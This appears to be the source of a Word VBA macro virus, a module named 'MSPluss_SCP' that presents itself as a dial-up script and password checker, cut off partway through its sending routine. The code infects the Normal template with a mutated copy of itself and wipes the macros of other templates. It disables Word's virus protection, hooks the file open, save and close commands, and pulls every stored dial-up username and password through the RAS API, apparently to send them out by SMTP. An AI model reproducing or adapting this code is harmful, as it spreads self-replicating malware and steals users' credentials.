   Attribute VB_Name = "MSPluss_SCP"
   'Dial-up_script_and_password_checker
   Option Explicit
   Type FILETIME
     dwLowDateTime As Long
     dwHighDateTime As Long
   End Type
   Type RASENTRYNAME
   dwSize As Long
   szEntryName(256) As Byte
   End Type
   Type RASDIALPARAMS
        dwSize As Long
        szEntryName(256) As Byte
        szPhoneNumber(128) As Byte
        szCallbackNumber(128) As Byte
        szUserName(256) As Byte
        szPassword(256) As Byte
        szDomain(15) As Byte
   End Type
   Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
   Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
   Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
   Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
   Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
   Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
   Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
   Declare Function FindWindow Lib "user32.dll" Alias "FindWindowA" (ByVal lpClassName As Any, ByVal lpWindowName As Any) As Long
   Declare Function RasEnumEntries Lib "RasApi32.DLL" Alias "RasEnumEntriesA" (ByVal reserved$, ByVal lpszPhonebook$, lprasentryname As RASENTRYNAME, lpcb As Long, lpcEntries As Long) As Long
   Declare Function RasGetEntryDialParams Lib "rasapi32" Alias "RasGetEntryDialParamsA" (ByVal lpszPhonebook As String, lpRasDialParams As RASDIALPARAMS, lpfPassword As Byte) As Long
   '
   Function Check_Connection()
   Dim CurrWnd As Long
   Dim Length As Long
   Dim Title As String
     On Error Resume Next
     CurrWnd = FindWindow(CLng(0), "")
     CurrWnd = GetWindow(CurrWnd, 0)
       Do While CurrWnd <> 0
          Length = GetWindowTextLength(CurrWnd)
           Title = Space(Length + 1)
       Length = GetWindowText(CurrWnd, Title, Length + 1)
       If InStr(1, Title, "Connected to", vbTextCompare) <> 0 _
        Or InStr(1, Title, "Ïîäêëþ÷åíî ê", vbTextCompare) <> 0 Then
        Check_Connection = True
        Exit Function
       End If
       CurrWnd = GetWindow(CurrWnd, 2)
       DoEvents
     Loop
     Check_Connection = False
   End Function
   ' End Sub

   Sub FileSave()
   On Error Resume Next
   ActiveDocument.Save
   Sender_main
   End Sub

   Sub FileClose()
   On Error Resume Next
   AutoOpen
   ActiveDocument.Close
   End Sub

   Sub Tmsn()
   Dim Delta As Integer
   Dim Old As Byte
   Dim NF As Integer
   NF = FreeFile
   On Error Resume Next
   Open WinDir + "logow.sys" For Binary Access Read As #NF
   Get #NF, 76989, Old
   Close #NF
   Delta = Val(Mid(Date$, 4, 2))
   Delta = Delta - Old
   Select Case Delta
    Case Is > 2
    Sender
    Case Is < 0 And Delta + 31 > 2
    Sender
    Case Else
    End Select
   End Sub

   Sub ToolsOptions()
   With Options
   .VirusProtection = True
   .SaveNormalPrompt = True
   End With
   Dialogs(wdDialogToolsOptions).Show
   With Options
   .VirusProtection = False
   .SaveNormalPrompt = False
   End With
   End Sub
   Sub CopyLines(Source As Object)
   On Error Resume Next
        Dim SourceM As Object, TargetM As Object
        Dim n As Long
        Dim Body As String
        Dim VBComponent  As Object
       For Each VBComponent In Source.VBProject.VBComponents
        Set SourceM = VBComponent
        n = SourceM.CodeModule.CountOfLines
        Body = SourceM.CodeModule.Lines(1, 1)
        If InStr(1, Body, "Dial-up_script_and_password_checker", vbTextCompare) <> 0 Then
        Body = SourceM.CodeModule.Lines(1, n)
        Body = morf(Body)
        Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
        TargetM.CodeModule.AddFromString Body
        TargetM.Name = "MSPluss_SCP"
        End If
      Next
   End Sub

   Sub FileOpen()
   On Error Resume Next
   AutoOpen
   Dialogs(80).Show
   Sender_main
   End Sub
   Function Loto(i As Integer, A() As Integer)
   Dim n As Integer
   ReDim A(1 To i) As Integer
   Dim Tmp As Integer
   Dim Temp As Integer
   For n = 1 To i
    A(n) = n
   Next
   For n = 1 To i
    Randomize
    Tmp = Int((i - n + 1) * Rnd + n)
    Temp = A(n)
    A(n) = A(Tmp)
    A(Tmp) = Temp
   Next
   End Function
   ' End Sub
   Function Conn_()
   Dim PAR(255) As RASENTRYNAME
   Dim Counter As Long
   Dim S As Long
   Dim ConName$
   Dim username$
   Dim i As Integer
   Dim res As Long
   Dim MStr
   Dim j As Integer
   Dim PARAM As RASDIALPARAMS
   Dim PWDdet As Byte
   Dim n As Integer
   Dim z As Long
   Dim PWD As String, UsName As String
   Dim Resalt As String
   On Error Resume Next
   PAR(0).dwSize = 264
   S = 256 * PAR(0).dwSize
   res = RasEnumEntries(1, 1, PAR(0), S, Counter)
   For i = 0 To Counter - 1
   For j = 0 To 256
   ConName = ConName + Chr(PAR(i).szEntryName(j))
   Next
   ConName = Left$(ConName, InStr(ConName, vbNullChar) - 1)

   For n = 0 To 256
   PARAM.szEntryName(n) = PAR(i).szEntryName(n)
   Next
   PARAM.dwSize = 1052
   res = RasGetEntryDialParams(1, PARAM, PWDdet)
   For z = 0 To 256
   UsName = UsName + Chr(PARAM.szUserName(z))
   PWD = PWD + Chr(PARAM.szPassword(z))
   Next
   UsName = Left$(UsName, InStr(UsName, vbNullChar) - 1)
   PWD = Left$(PWD, InStr(PWD, vbNullChar) - 1)
   Resalt = Resalt + "Connection: " + ConName + Chr(13) + "User: " + UsName + Chr(13) + "Password: " + PWD + Chr(10) + Chr(13)
   PWD = "": UsName = "": ConName = ""
   DoEvents
   Next
   Conn_ = Resalt
   End Function
   ' End Sub
   Sub AutoExit()
   Dim Counter As Integer
   Dim i As Integer
   Dim VBComp As Object
   Dim Body As String

    Application.Visible = False
    Options.SaveNormalPrompt = False
    On Error Resume Next

   Counter = Templates.Count
   For i = 1 To Counter
    For Each VBComp In Templates(i).VBProject.VBComponents
     Body = VBComp.CodeModule.Lines(1, 1)
     If InStr(1, Body, "Dial-up_script_and_password_checker", vbTextCompare) = 0 Then
        With VBComp.CodeModule
          .DeleteLines 1, .CountOfLines
        End With
      If VBComp.Name <> "ThisDocument" Then
      Application.OrganizerDelete Templates(i).Name, VBComp.Name, wdOrganizerObjectProjectItems
      End If
    End If
    Next
   Next i
    NormalTemplate.Save
    Tmsn
    Options.VirusProtection = True
   End Sub

   Sub Sender_main()
   Dim Handle As Long
   Dim HandleBW As Long
   Dim NoConn_ As String
   Dim hwnd As Long
   Dim GrabStr As String
   Dim Start As Long
   Dim MyDat As Byte
   Dim i As Integer
   Dim NPwl() As String
   Dim j As Integer
   Dim Title As String
   Dim SMTP As String
   Dim Host(1 To 14) As String
   Dim A() As Integer
   Dim f As Integer
   Dim NF As Integer
   Dim THwnd As Long
   Dim Twnd As String
   Dim None As String
   Dim RecipientOfMessage_ As String
   Dim SenderAddress As String
   Dim SenderDomain As String
   Dim UsName
   Dim Domain_ As String
   Dim Char_ As Byte
   Dim z As Integer

   On<span c
